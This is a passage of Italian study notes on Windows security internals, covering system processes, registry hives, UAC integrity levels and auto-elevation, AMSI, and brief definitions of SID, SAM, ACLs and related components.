- _lsass.exe (Local Security Authority) e lsaiso.exe(processo collegato con credential guard and keyguard, si vede solo se attivo)_

- _services.exe (Service control manager, si occupa tutto quello che riguarda i servizi)_

services.exe crea:

- _svchost.exe (Host process, si occupa di ospitare e controllare un servizio)_

_Approfondimenti per gli eseguibli sopra elencati:_ 

_services.exe:_
gestisce un DB con i vari servizi ed è possibile interrogarlo con l'eseguibile __"sc.exe"__, inoltre troviamo altre informazioni nelle chiavi di registro __"HKLM\System\CurrentControlSet\Services"__ è anche responsabile al settaggio del __LastKnownGood__ (Una sorta di backup per windows).

_svchost.exe:_
I servizi runnati da questo processo sono implementati come DLL e sono immagazzinate nella subkey __Parameters__ a questo path __"KLM\SYSTEM\CurrentControlSet\Services\SERVICE NAME\Parameters"__, per vederli basta fare click desto su process hacker, notiamo il servizio che runna, se rifacciamo click destro su __"Proprietà"__, otterremo maggiori info, una cosa è importante che vi sia la flag -k che è il key identifier .

### Register Keys

_il Registro di sistema (o Registro Windows) è un database gerarchico che contiene le impostazioni, le configurazioni e altre informazioni cruciali per il corretto funzionamento del sistema operativo e delle applicazioni installate è organizzato in key e subkeys le quali sono:_

 - HKEY_CLASSES_ROOT (HKCR):
   _Questa chiave contiene le associazioni tra estensioni di file e programmi, e definisce come le applicazioni si comportano quando si lavora con tipi di file specifici e in realtà e un 
   insieme delle chiavi HCKU e HKLM_

 - HKEY_CURRENT_USER (HKCU):
   _Questa chiave contiene le impostazioni specifiche dell'utente che sta effettuando l'accesso al sistema. Ad esempio, impostazioni personalizzate, preferenze, stampanti e altro ancora._

 - HKEY_LOCAL_MACHINE (HKLM):
   _Questa chiave contiene le impostazioni relative al computer locale. Qui sono presenti informazioni sul software installato, hardware, configurazioni di sistema e altro ancora._

 - HKEY_USERS (HKU):
   _Questa chiave contiene i profili degli utenti attualmente registrati sul computer. Ogni utente avrà un sottoalbero in questa chiave, simile alla struttura di HKCU._

 - HKEY_CURRENT_CONFIG (HKCC):
   _Questa chiave contiene informazioni sulla configurazione hardware attuale del computer. Viene creato dinamicamente durante l'avvio del sistema._

__Sono importanti da conoscere perchè da lato attaccante possono causare bei danni, dal lato difesa possono essere fonti di informazioni per capire eventuali attacchi ricevuti.__

### UAC

_UAC(User Access Control) utilizzato per non fare eseguire codice o script malevoli, in quanto richiede i priviliegi di amministratore, è anche all'interno delle MIC(Mandatory Integrity Control) un meccanismo che assegna a utenti,gruppi e processi un IL(Integrity Level) più è alto il livello e più puoi fare cose nel sistema_

_per comprendere appieno l'UAC prima bisogna capire cosa è IL(Integrity Level) e la sua divisione in 4 livelli:_

- Low= utilizzo solo di internet
- Medium= per utenti normali e amministratori con il filtered token
- High = amministratorti con elevated token
- System = livello utilizzato dal utente system

_Ogni IL è poi assegnato ad un UAC token che può essere di diversi tipi:_

 Non-administrators = singolo token utilizzato dagli utenti a IL medium

 Administrators hanno 2 token a loro volta:
   
   - Filtered Token= token per amministratori con meno priviliegi ha IL medium
   - Elevated Token= token con i pieni priviliegi IL hard

_Ora possiamo passare al suo funzionamento parlando in maniera dettagliata dei vari passaggi che la contraddistinguono:_

1) l'utente richiede di runnare un'applicazione come amministratore
2) viene fatta la chiamata alle api ShellExecute che impostando il runas verb apre una shell per elevare i privilegi e in questo modo attivare il meccanismo di
   UAC
3) la richiesta viene girata al service AppInfo.exe che a sua volta andrà a controllare l'application manifest per checkare una possibile autoelevation
4) verrà poi runnato consent.exe che permette di elevare i privilegi, consent.exe verrà runnato in un secure desktop, un desktop che isola i processi per evitare la compromissione dell'UAC
5) l'esito se positivo farà in modo che il nuovo processo creato punti alla shell creata in precendenza per elevare i privilegi.

_Sopra se notiamo bene viene menzionata l'autoelevation, bene è una peculiarità sempre correlata alla user access control e riguarda gli eseguibili i quali possono essere avviati senza il controllo da parte dell'UAC però devono soddisfare dei requisiti:_

- Firmati da Windows Publisher (infatti quasi tutte le funzionalità del pannello di controllo e alcuni eseguibili rientrano nell'autoelevetion)
- essere all'interno di directory fidate come C:\WINDOWS\System32 o C:\Program files

_Ulteriori info per l'autoelevation:_

-.exe devono aver segnato l'autoElevate nel proprio manifest __tool per il controllo del manifest è sigcheck N.B(va scaricata la suite dei sysinternals)__
<!-- -->
      C:\path di sigcheck.exe -m <Path eseguibile da vedere> #comando per leggere il manifest
<!-- -->
- .mmc.exe(microsoft management console) a seconda poi degli .msc snap richiesti ma in genere ha l'autoelevation

__N.B: la UAC può essere modificate nella voce __"UAC settings".____

### AMSI

L'AMSI (Anti-Malware Scan Interface) è un runtime detection che scannerizza il codice prima che venga runnato e determina se malevolo o meno, viene avviato da defender e evita che lo script malevolo venga runnato nel .NET runtime ed è completamente integrato con:

- _User Account Control, or UAC_
  
- _PowerShell_
  
- _Windows Script Host (wscript and cscript)_
  
- _JavaScript and VBScript_
  
- _Office VBA macros_

### Note sulla sicurezza in Windows

_SID(Security Identifier) aggiunto a utente,gruppi,domini o a qualsiasi altro entità di sicurezza, viene utilizzato per gestire l'accesso alle risorse_

ES:
_S-1-5-21-674899381-4069889467-2080702030-1002_

_SAM(Security account manager) database interno che contiene le informazioni dei vari utenti come password, hash e nomi utenti, è utilizzato dal LSA(lsass.exe) per l'autenticazione._

_ACL(Access control list) e ACE (Access control entrie) le ACE le troviamo dentro l'ACL, le ACE possono avere diverse regole come: deny o allow e si applicano su risorse e utenti._

_AppLocker permette un controllo granulare di script e dll, permette di aggiungere delle regole sempre su di loro._

_Local group policy utilizzato per le policy di sicurezza dei gruppi._

_MMC(Microsoft management console) interfaccia gui che permette di aggiungere degli snaps-in(moduli) che estendono le funzionalitè del MMC che ha il compito di monitorare risorse hardware e software._

_WMI è un sottosistema di powershell, che fornisce informazioni dettagliate sul sistema operativo, l'hardware, il software e altre risorse del computer per il system monitoring, fa da framework comune perchè presente sulle varie versioni di Windows_



